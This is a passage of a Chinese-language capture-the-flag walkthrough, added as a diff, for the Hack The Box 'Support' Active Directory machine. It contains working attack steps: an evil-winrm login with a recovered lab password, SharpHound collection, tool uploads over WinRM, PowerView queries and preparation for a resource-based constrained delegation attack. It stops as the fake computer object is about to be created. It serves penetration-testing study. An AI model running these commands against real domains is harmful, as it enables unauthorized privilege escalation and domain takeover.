@@ -359,3 +359,251 @@ info 字段本来常见内容应该是：
 “Helpdesk user”
 ```
 #### 在用户列表中，有一个似乎很突出，叫做“支持”。查看这个用户的属性，我们发现a非默认标签名为info，值为Ironside47pleasure40Watchful。这看起来很像密码。再往下看，我们还可以看到该用户是Remote Management Users的成员组，允许它们通过WinRM进行连接。为此，让我们尝试使用evil-winrm来连接使用已识别的密码远程联系支持用户。
+#### 5985/tcp (WinRM)
+```
+[★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\support\Documents> whoami
+support\support
+*Evil-WinRM* PS C:\Users\support\Documents> cat ../Desktop/user.txt
+```
+### Privilege Escalation
+#### Nmap输出已经向我们揭示了机器属于一个域。我们可以得到更多通过通常预安装的Active Directory powershell模块获取域信息在域控制器上。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain //用来查询当前 Active Directory 域的基本信息；它来自模块：ActiveDirectory（RSAT）
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {}
+ComputersContainer                 : CN=Computers,DC=support,DC=htb
+DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
+DistinguishedName                  : DC=support,DC=htb
+DNSRoot                            : support.htb	//域名，之后用 -d support.htb
+DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
+DomainMode                         : Windows2016Domain		//2016,安全特性级别
+DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
+Forest                             : support.htb	//林,看是不是单林环境
+InfrastructureMaster               : dc.support.htb
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
+LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
+ManagedBy                          :
+Name                               : support
+NetBIOSName                        : SUPPORT	//老域名，有些工具用 SUPPORT\user
+ObjectClass                        : domainDNS
+ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+ParentDomain                       :
+PDCEmulator                        : dc.support.htb		//主域控,攻它 = 拿整个域
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {dc.support.htb}
+RIDMaster                          : dc.support.htb
+SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
+SystemsContainer                   : CN=System,DC=support,DC=htb
+UsersContainer                     : CN=Users,DC=support,DC=htb
+
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> 
+
+```
+#### 添加域控
+```
+[★]$ sudo sed -i 's/10.129.6.171 support.htb/10.129.6.171 support.htb dc.support.htb/' /etc/hosts
+```
+#### 我们还可以检查当前用户是否是任何感兴趣的组的成员。
+```
+*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                           Attributes
+========================================== ================ ============================================= ==================================================
+Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+```
+#### 看SUPPORT\Shared Support Accounts
+#### support用户似乎也是一个名为共享支持帐户的非默认组的成员作为Authenticated Users组。让我们使用BloodHound来识别这个域的潜在攻击路径这可以帮助我们增加特权。首先，让我们安装BloodHound所需的Neo4j数据库。
+```
+[★]$ sudo neo4j start
+Directories in use:
+home:         /var/lib/neo4j
+config:       /etc/neo4j
+logs:         /var/log/neo4j
+plugins:      /var/lib/neo4j/plugins
+import:       /var/lib/neo4j/import
+data:         /var/lib/neo4j/data
+certificates: /var/lib/neo4j/certificates
+licenses:     /var/lib/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j (pid:117720). It is available at http://localhost:7474
+There may be a short delay until the server is ready.
+```
+#### 然后我们可以从发布页面下载预编译的《寻血猎犬》二进制文件。下载了正确的归档为我们的CPU类型，我们可以提取并执行它。
+https://github.com/SpecterOps/BloodHound-Legacy/releases
+```
+[★]$ unzip BloodHound-linux-x64.zip
+```
+#### 点击登录，把寻血猎犬暂时放在一边，因为我们必须从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目
+https://github.com/SpecterOps/BloodHound-Legacy
+```
+[★]$ git clone https://github.com/BloodHoundAD/BloodHound
+[★]$ ls BloodHound/
+Collectors            main.js            server.js
+docs                  package.json       src
+index.html            package-lock.json  webpack.config.development.js
+LICENSE-3RD-PARTY.md  README.md          webpack.config.production.js
+LICENSE.md            renderer.js
+[★]$ ls BloodHound/Collectors/
+AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
+```
+#### 我们将使用SharpHound.exe二进制文件来收集活动目录数据，这些数据可以在BloodHound中找到项目，特别是在BloodHound/Collectors/目录中。我们可以使用之前打开的Evil-WinRM会话来上传它(前提是SharpHound.exe存在于与我们启动Evil-WinRM的文件夹相同)。
+```
+[~/BloodHound/Collectors][★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
+                                        
+Info: Uploading /home/syareya55/BloodHound/Collectors/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe
+                                        
+Data: 1395368 bytes of 1395368 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
+<SNIP>
+2026-01-31T00:12:05.3242712-08:00|INFORMATION|SharpHound Enumeration Completed at 12:12 AM on 1/31/2026! Happy Graphing!
+
+```
+#### 执行完成后，我们可以看到在同一目录中创建了一个Zip文件
+```
+*Evil-WinRM* PS C:\Users\support\Documents> dir
+
+
+    Directory: C:\Users\support\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         1/31/2026  12:12 AM          12357 20260131001204_BloodHound.zip
+-a----         1/31/2026  12:10 AM        1046528 SharpHound.exe
+-a----         1/31/2026  12:12 AM          10022 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin
+
+*Evil-WinRM* PS C:\Users\support\Documents> download 20260131001204_BloodHound.zip
+                                        
+Info: Downloading C:\Users\support\Documents\20260131001204_BloodHound.zip to 20260131001204_BloodHound.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\support\Documents> exit
+                                        
+Info: Exiting with code 0
+```
+#### 下载后，我们只需要将压缩文件拖放到BloodHound窗口中即可加载获得的数据。加载完数据后，我们可以在左上角搜索SUPPORT@SUPPORT.HTB角，以便找到当前用户。然后我们可以右键单击用户对象并选择将用户标记为用来指定我们已经以该用户的身份访问系统。
+```
+[★]$ cd BloodHound-linux-x64
+[~/Downloads/BloodHound-linux-x64][★]$ ls
+BloodHound              libGLESv2.so            resources.pak
+chrome_100_percent.pak  libvk_swiftshader.so    snapshot_blob.bin
+chrome_200_percent.pak  libvulkan.so            swiftshader
+chrome-sandbox          LICENSE                 v8_context_snapshot.bin
+icudtl.dat              LICENSES.chromium.html  version
+libEGL.so               locales                 vk_swiftshader_icd.json
+libffmpeg.so            resources
+[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
+```
+#### 然后就先在浏览器上的本地7474端口输入：账户neo4j 密码neo4j
+#### 其次在弹跳出的BloodHound输入：账户neo4j 密码neo4j ，在就点击Upload data上传20260131001204_BloodHound.zip
+#### 在BloodHound搜索框输入：SUPPORT@SUPPORT.HTB，双击选择‘！ Mark User as Owned'
+#### 我们可以看到组委托对象控制部分显示值为1。该值显示用户所属的组是否有权访问控制对象在域中。让我们点击它来查看更多细节。
+#### 'Node Info' -> 'Group Delegated Object Control'
+![图片](mages/2026013101.png)
+#### 实际上，输出显示Shared Support Accounts组在系统上具有GenericAll特权由于支持用户是该组的成员，因此他们也具有所有权限直流。右键单击GenericAll行并选择Help可提供有关此操作的更多信息特权以及如何利用它。
+![图片](mages/2026013102.png)
+#### BloodHound提到，由于GenericAll特权，我们可以执行基于资源的约束授权（RBCD）攻击并升级我们的特权。
+### Resource Based Constrained Delegation 基于资源的约束授权
+https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
+#### 简而言之，通过基于资源的约束委托攻击，我们可以将计算机添加到我们对域的控制；让我们将这台计算机命名为$FAKE-COMP01，并配置域控制器（DC）允许$FAKE-COMP01代表它行动。然后，通过代表DC，我们可以请求Kerberos $FAKE-COMP01的门票，具有在域中冒充高级特权用户的能力，例如署长。生成Kerberos票据后，我们可以传递票据（PtT）并进行身份验证作为这个特权用户，我们可以控制整个域。
+```
+这种攻击依赖于三个先决条件：
+[1]我们需要作为属于Authenticated Users组的域用户执行shell或代码。默认情况下，此组的任何成员最多可以将10台计算机添加到域。
+[2]ms-ds-machineaccountquota属性值需要大于0。此属性控制通过身份验证的域用户可以添加到域的计算机数量。
+[3]当前用户或用户所属的组需要具有WRITE权限（GenericAll, WriteDACL）通过加入域的计算机（在本例中是域控制器）。
+```
+#### 从前面的枚举中，我们知道支持用户确实是类的成员认证用户组以及共享支持帐户组。我们也知道共享支持帐户组对域控制器具有GenericAll权限（dc.support.htb）
+#### 让我们检查ms-ds-machineaccountquota属性的值。任何 没有其他特殊权限的管理员用户最多可以创建10 个计算机对象（MachineAccountQuota），并为其设置SPN
+```
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+
+
+DistinguishedName         : DC=support,DC=htb
+ms-DS-MachineAccountQuota : 10
+Name                      : support
+ObjectClass               : domainDNS
+ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+
+//这个域允许普通用户最多创建多少台计算机账户？10台
+```
+#### 上述命令的输出显示，该属性被设置为10，这意味着每个都经过身份验证域用户最多可以将10台计算机加入域。接下来，让我们验证msds-allowedtoactonbehalfofotheridentity属性是否为空。为此，我们PowerShell需要PowerView模块。我们可以通过Evil-WinRM上传到服务器，如图所示之前。然后我们可以用下面的命令导入它。
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+```
+[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+
+*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> . ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> //一旦模块被导入，我们就可以使用Get-DomainComputer命令来查询所需的信息。
+
+*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+
+name msds-allowedtoactonbehalfofotheridentity
+---- ----------------------------------------
+DC
+
+
+*Evil-WinRM* PS C:\Users\support\Documents>
+
+```
+#### 该值为空，这意味着我们准备执行RBCD攻击，但首先让我们上传工具这是必须的。我们将需要PowerMad和Rubeus，我们可以使用Evil-WinRM上传，如图所示之前。PowerMad可以通过以下命令导入。
+https://github.com/Kevin-Robertson/Powermad
+https://github.com/GhostPack/Rubeus
+```
+[★]$ git clone https://github.com/Kevin-Robertson/Powermad.git
+[★]$ git https://github.com/GhostPack/Rubeus.git
+[★]$ ls Powermad/
+Invoke-DNSUpdate.ps1  Powermad.ps1   Powermad.psm1
+LICENSE               Powermad.psd1  README.md
+[★]$ ls Rubeus/
+CHANGELOG.md  LICENSE  README.md  Rubeus  Rubeus.sln  Rubeus.yar
+//Rubeus.sln 不能在 Evil-WinRM 里编译；只能在你自己的 Windows 编译好，再上传 Rubeus.exe//疯了
+
+打开win11,下载了整个Rubeus压缩包，解压，点击 Rubeus.sln 使用VS2022打开
+[1]右键 Rubeus 项目,选择 重新加载项目,选择.NET Framework 4.8
+[2]生成 (Build) → 生成解决方案 。生成 exe，Rubeus\bin\Debug\Rubeus.exe
+
+[★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+
+
+```
+### Creating a Computer Object //创建计算机对象
+#### 现在，让我们创建一台假计算机并将其添加到域。我们可以使用PowerMad的New-MachineAccount为了实现这个目标
